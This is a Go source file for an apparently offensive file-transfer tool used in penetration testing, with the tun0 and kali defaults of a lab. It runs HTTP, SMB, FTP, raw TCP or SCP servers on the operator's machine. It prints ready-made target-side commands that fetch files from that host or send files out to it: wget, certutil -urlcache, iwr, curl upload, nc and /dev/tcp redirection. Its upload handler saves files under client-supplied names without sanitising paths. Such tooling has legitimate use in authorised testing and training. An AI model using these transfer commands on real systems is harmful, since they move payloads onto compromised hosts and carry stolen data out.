package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

func getLocalIP(interfaceName string) string {
	iface, err := net.InterfaceByName(interfaceName)
	if err != nil {
		return "127.0.0.1" // Fallback
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}

func printSyntax(protocol, ip, port string) {
	fmt.Printf("\n[+] Target Execution Syntax for %s\n", strings.ToUpper(protocol))
	fmt.Println(strings.Repeat("-", 60))

	switch protocol {
	case "http":
		fmt.Println("Linux Download   : wget http://" + ip + ":" + port + "/<file> -O /tmp/<file>")
		fmt.Println("Linux Upload     : curl -F 'file=@<file>' http://" + ip + ":" + port + "/upload")
		fmt.Println("Windows Download : certutil.exe -urlcache -f http://" + ip + ":" + port + "/<file> <file>")
		fmt.Println("Windows Download : iwr -uri http://" + ip + ":" + port + "/<file> -o <file>")
	case "smb":
		fmt.Println("Windows Download : copy \\\\" + ip + "\\share\\<file> .")
		fmt.Println("Windows Upload   : copy <file> \\\\" + ip + "\\share\\")
	case "ftp":
		fmt.Println("Linux/Windows    : ftp " + ip)
		fmt.Println("                   > anonymous / no password")
		fmt.Println("                   > get <file> OR put <file>")
		fmt.Println("Windows (Cmd)    : echo open " + ip + " > ftp.txt & echo anonymous >> ftp.txt & echo bin >> ftp.txt & echo get <file> >> ftp.txt & echo bye >> ftp.txt & ftp -s:ftp.txt")
	case "tcp":
		fmt.Println("Linux Download   : nc " + ip + " " + port + " > <file>")
		fmt.Println("Linux Download   : cat < /dev/tcp/" + ip + "/" + port + " > <file>")
		fmt.Println("Linux Upload     : cat <file> > /dev/tcp/" + ip + "/" + port)
	case "scp":
		fmt.Println("Note: Ensure local SSH service is running (systemctl start ssh)")
		fmt.Println("Linux Download   : scp kali@" + ip + ":/path/to/<file> .")
		fmt.Println("Linux Upload     : scp <file> kali@" + ip + ":/tmp/")
	}
	fmt.Println(strings.Repeat("-", 60) + "\n")
}

func startHTTP(port string) {
	http.Handle("/", http.FileServer(http.Dir(".")))
	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		r.ParseMultipartForm(32 << 20)
		file, handler, err := r.FormFile("file")
		if err != nil {
			fmt.Println("[-] Error receiving file:", err)
			return
		}
		defer file.Close()
		f, err := os.OpenFile(handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)
		if err != nil {
			fmt.Println("[-] Error saving file:", err)
			return
		}
		defer f.Close()
		io.Copy(f, file)
		fmt.Printf("[+] Successfully received uploaded file: %s\n", handler.Filename)
	})

	fmt.Printf("[*] Serving HTTP on 0.0.0.0:%s\n", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func startTCP(port string) {
	l, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatal("[-] Error starting TCP listener:", err)
	}
	defer l.Close()
	fmt.Printf("[*] Listening for raw TCP connections on 0.0.0.0:%s\n", port)

	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}
		fmt.Println("[+] Connection received from", conn.RemoteAddr())
		// Basic implementation: write incoming data to file
		f, _ := os.Create("tcp_received.bin")
		io.Copy(f, conn)
		f.Close()
		conn.Close()
		fmt.Println("[+] File received via TCP as tcp_received.bin")
	}
}

func startWrapper(command string, args []string) {
	cmd := exec.Command(command, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	fmt.Printf("[*] Starting %s...\n", command)
	err := cmd.Run()
	if err != nil {
		fmt.Printf("[-] Error running %s: %v\n", command, err)
	}
}

func main() {
	protocol := flag.String("p", "http", "Protocol to start: http, smb, ftp, tcp, scp")
	port := flag.String("port", "", "Custom port (defaults depend on protocol)")
	iface := flag.String("i", "tun0", "Interface to bind to for IP generation")
	flag.Parse()

	ip := getLocalIP(*iface)

	switch *protocol {
	case "http":
		if *port == "" {
			*port = "80"
		}
		printSyntax(*protocol, ip, *port)
		startHTTP(*port)
	case "smb":
		printSyntax(*protocol, ip, "445")
		startWrapper("impacket-smbserver", []string{"-smb2support", "share", "."})
	case "ftp":
		printSyntax(*protocol, ip, "21")
		startWrapper("python3", []string{"-m", "pyftpdlib", "-p", "21", "-w"})
	case "tcp":
		if *port == "" {
			*port = "9001"
		}
		printSyntax(*protocol, ip, *port)
		startTCP(*port)
	case "scp":
		printSyntax(*protocol, ip, "22")
		fmt.Println("[!] SCP does not require a custom server. Ensure system SSH is running.")
	default:
		fmt.Println("[-] Unknown protocol. Use -h for help.")
	}
}